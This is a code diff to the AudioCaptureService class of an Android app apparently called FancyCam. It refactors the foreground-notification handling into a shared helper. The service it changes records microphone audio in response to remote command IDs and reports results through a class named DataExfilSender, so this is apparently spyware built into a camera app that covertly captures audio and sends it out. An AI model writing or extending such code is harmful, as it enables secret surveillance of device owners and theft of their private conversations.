@@ -1,8 +1,5 @@
 package com.example.fancycam.services
 
-import android.app.Notification
-import android.app.NotificationChannel
-import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
@@ -13,9 +10,7 @@ import android.os.Build
 import android.os.IBinder
 import android.provider.Settings
 import android.util.Log
-import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
-import com.example.fancycam.R
 import com.example.fancycam.network.DataExfilSender
 import java.io.File
 
@@ -23,8 +18,7 @@ class AudioCaptureService : Service() {
 
     companion object {
         private const val TAG = "AudioCaptureService"
-        private const val CHANNEL_ID = "FancyCamAudioCapture"
-        private const val NOTIFICATION_ID = 4243
+        private const val OWNER = "audio_capture"
         const val EXTRA_COMMAND_ID = "extra_command_id"
         const val EXTRA_DURATION_MS = "extra_duration_ms"
         const val DEFAULT_DURATION_MS = 30000L
@@ -38,22 +32,12 @@ class AudioCaptureService : Service() {
         }
     }
 
-    override fun onCreate() {
-        super.onCreate()
-        createNotificationChannel()
-    }
-
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val notification = buildNotification()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            startForeground(
-                NOTIFICATION_ID,
-                notification,
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-            )
-        } else {
-            startForeground(NOTIFICATION_ID, notification)
-        }
+        ForegroundNotifier.startForeground(
+            this,
+            OWNER,
+            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        )
 
         val durationMs = intent?.getLongExtra(EXTRA_DURATION_MS, DEFAULT_DURATION_MS) ?: DEFAULT_DURATION_MS
         val commandId = intent?.getStringExtra(EXTRA_COMMAND_ID)
@@ -65,32 +49,6 @@ class AudioCaptureService : Service() {
         return START_NOT_STICKY
     }
 
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "FancyCam Audio Capture",
-                NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "Foreground audio capture service"
-                setShowBadge(false)
-            }
-            (getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager)
-                ?.createNotificationChannel(channel)
-        }
-    }
-
-    private fun buildNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setSmallIcon(R.drawable.ic_camera_switch)
-            .setContentTitle("FancyCam")
-            .setContentText("Capturing audio in background…")
-            .setOngoing(true)
-            .setOnlyAlertOnce(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
-    }
-
     private fun runCapture(durationMs: Long, commandId: String?) {
         val cleanDuration = if (durationMs > 0) durationMs else DEFAULT_DURATION_MS
 
@@ -99,6 +57,7 @@ class AudioCaptureService : Service() {
             if (commandId != null) {
                 DataExfilSender.reportCommandResult(this, commandId, status = "failed", error = "RECORD_AUDIO permission not granted")
             }
+            ForegroundNotifier.stopForeground(this, OWNER)
             stopSelf()
             return
         }
@@ -153,7 +112,7 @@ class AudioCaptureService : Service() {
                 DataExfilSender.reportCommandResult(this, commandId, status = "failed", error = e.message)
             }
         } finally {
-            stopForeground(STOP_FOREGROUND_REMOVE)
+            ForegroundNotifier.stopForeground(this, OWNER)
             stopSelf()
         }
     }
